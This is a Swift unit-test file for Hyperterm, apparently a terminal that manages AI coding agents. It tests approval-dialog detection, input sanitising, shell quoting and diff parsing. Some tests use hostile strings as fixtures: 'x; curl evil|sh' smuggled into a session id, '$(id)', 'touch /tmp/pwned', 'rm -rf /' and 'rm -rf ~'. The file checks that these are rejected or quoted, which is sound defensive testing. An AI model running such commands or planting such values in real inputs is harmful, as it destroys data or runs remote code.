import XCTest
@testable import Hyperterm

final class SafetyAndReviewTests: XCTestCase {
    private let claudeDialog = """
     Bash command
     touch hyperterm-perm-test.txt
     Do you want to proceed?
     ❯ 1. Yes
       2. Yes, and don't ask again for touch commands in /repo
       3. No
     Esc to cancel · Tab to amend
    """

    func testDialogDetectionAndKeys() {
        XCTAssertTrue(PromptScreen.hasDialog(claudeDialog))
        XCTAssertEqual(PromptScreen.keys(for: .approve, screen: claudeDialog, kind: .claude), ["1"])
        XCTAssertEqual(PromptScreen.keys(for: .always, screen: claudeDialog, kind: .claude), ["2"])
        XCTAssertEqual(PromptScreen.keys(for: .deny, screen: claudeDialog, kind: .claude), ["3"])
    }

    func testNoDialogMeansNoKeys() {
        let idle = "⏺ Done.\n───────\n❯ \n───────"
        XCTAssertFalse(PromptScreen.hasDialog(idle))
        XCTAssertNil(PromptScreen.keys(for: .approve, screen: idle, kind: .claude))
        // An agent's own text mentioning "Do you want" without numbered options isn't a dialog.
        XCTAssertFalse(PromptScreen.hasDialog("Do you want me to continue with the refactor?"))
    }

    func testSanitizeStripsEscapesAndBidi() {
        let hostile = "hi\u{1b}[201~\u{1b}]0;x\u{07}\u{202E}there\nnext"
        XCTAssertEqual(sanitizeMessage(hostile), "hi[201~]0;xthere\nnext")
    }

    func testSafeIdentifiers() {
        XCTAssertTrue(isSafeIdentifier("1f410ebd-b091-4545-bdc8-3b567e5a885f"))
        XCTAssertTrue(isSafeIdentifier("thr_9abc"))
        XCTAssertFalse(isSafeIdentifier("x; touch /tmp/pwned"))
        XCTAssertFalse(isSafeIdentifier("$(id)"))
    }

    func testShellQuote() {
        XCTAssertEqual(shellQuote("it's"), "'it'\\''s'")
        XCTAssertEqual(shellQuote("a b; rm -rf /"), "'a b; rm -rf /'")
    }

    func testResumeIgnoresUnsafeIds() {
        var spec = LaunchSpec(label: "api", kind: .claude, cwd: "/tmp")
        spec.agentSessionId = "x; curl evil|sh"
        let input = AgentIntegration.initialInput(for: spec, resume: true) ?? ""
        XCTAssertFalse(input.contains("curl"))
        XCTAssertTrue(input.hasPrefix("~/.hyperterm/bin/claude --name 'api'"))
    }

    func testTaskIsQuotedIntoTheLaunchLine() {
        let spec = LaunchSpec(label: "fix", kind: .claude, cwd: "/tmp")
        let input = AgentIntegration.initialInput(for: spec, resume: false, task: "fix it; rm -rf ~") ?? ""
        XCTAssertTrue(input.contains("'fix it; rm -rf ~'"))
    }

    func testPatchParsingTracksNewLineNumbers() {
        let patch = """
        diff --git a/a.ts b/a.ts
        --- a/a.ts
        +++ b/a.ts
        @@ -10,3 +10,4 @@
         context
        -old
        +new one
        +new two
         tail
        """
        let lines = PatchLine.parse(patch)
        XCTAssertEqual(lines.first?.kind, .header)
        XCTAssertEqual(lines.first { $0.text == "context" }?.newNumber, 10)
        XCTAssertNil(lines.first { $0.text == "old" }?.newNumber)
        XCTAssertEqual(lines.first { $0.text == "new two" }?.newNumber, 12)
        XCTAssertEqual(lines.first { $0.text == "tail" }?.newNumber, 13)
    }

    func testRecapSentence() {
        let now = Date()
        let events = [
            TimelineEvent(date: now, kind: .edit, text: "Edit: a.ts"),
            TimelineEvent(date: now, kind: .edit, text: "Edit: b.ts"),
            TimelineEvent(date: now, kind: .test, text: "Tests passed: 48 passed"),
            TimelineEvent(date: now, kind: .done, text: "Added refresh rotation"),
        ]
        XCTAssertEqual(Recap.sentence(for: events), "2 edits, tests passed, finished: Added refresh rotation.")
    }

    func testTestCommandDetection() {
        XCTAssertTrue(TestCommand.matches("pnpm vitest run auth"))
        XCTAssertFalse(TestCommand.matches("git status"))
        XCTAssertEqual(TestCommand.summary(from: "stuff\n Tests  48 passed (48)\n", passed: true), "Tests  48 passed (48)")
    }

    func testDiffStatText() {
        XCTAssertEqual(DiffStat(added: 3, removed: 1, files: 1).text, "+3 −1 · 1 file")
    }
}
